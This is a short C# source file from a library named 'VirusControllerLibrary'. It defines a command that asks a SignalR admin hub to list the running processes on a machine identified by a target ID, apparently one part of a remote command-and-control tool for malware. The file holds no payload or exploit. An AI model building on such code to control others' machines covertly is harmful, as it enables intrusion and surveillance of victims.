using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class GetRunningProcessesCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public override string Name => "GetRunningProcesses";

        public GetRunningProcessesCommand(string targetId) =>
            TargetId = targetId;
        
        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId);
    }
}
